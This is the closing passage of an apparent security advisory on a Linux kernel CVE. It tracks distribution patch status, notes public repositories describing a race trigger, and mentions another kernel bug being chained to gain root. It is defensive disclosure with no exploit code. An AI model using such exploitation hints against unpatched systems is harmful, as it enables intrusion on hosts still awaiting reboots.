limits with bridged container traffic and CIPSO. 36 GitHub repositories now reference the CVE. Ubuntu, Debian, Oracle, NVD&#x27;s status, and KEV are unchanged, and the stable kernels released October 30 don&#x27;t include the IPv6 follow-up.<br>- October 29, 8:00 PM CDT: Added Oracle Linux, fixed in its UEK kernels since October 16, and Amazon Linux, fixed in Amazon Linux 2023&#x27;s 6.12 and 6.18 kernels and pending elsewhere. Eight GitHub repositories now reference the CVE, one describing a race trigger. Ubuntu, Red Hat, Debian, SUSE, NVD, and KEV are unchanged since 11:00 AM, and nothing was corrected.<br>Get help<br>If the hard part is knowing which hosts, nodes, and appliances run which kernel, and which of them can reboot this week, our advisors can help plan it.<br>The bug is reachable through any listening TCP port, so it helps to know which ones the internet can see. Our free external audit checks the domains and public IPs you verify for exposed services, publicly visible software versions with known CVEs, TLS, email security, DNS, and HTTP headers.<br>It&#x27;s the second Linux kernel fix this month that only takes effect after a reboot. The other, Fragnesia, is being chained with PHP2Shell to get root.<br>Sources<br>- Linux kernel: fix commit e3f33b0 · patch on lore · stable commits for 7.2.10, 6.18.56, 6.12.113, 6.6.159, 6.1.190, 5.15.223, and 5.10.272 · kernel.org releases<br>- CVE records: cve.org · NVD<br>- Advisories: Red Hat RHSB-2026-016 · AlmaLinux · Go Security Team, via oss-security · Go&#x27;s multipathtcp setting<br>- Distributions: Ubuntu · Red Hat · AlmaLinux errata · Debian · SUSE · Oracle Linux · Amazon Linux<br>- Research: Anthropic: Discovering and exploiting vulnerabilities in critical, real-world software with Claude · Anthropic&#x27;s coordinated vulnerability disclosure policy<br>The Atlas security byline: write-ups of vulnerabilities in widely deployed software — what changed, who is exposed, and what to check — verified against primary sources.</div>
+</div>
+
+</div>
+
+</body>
+</html>
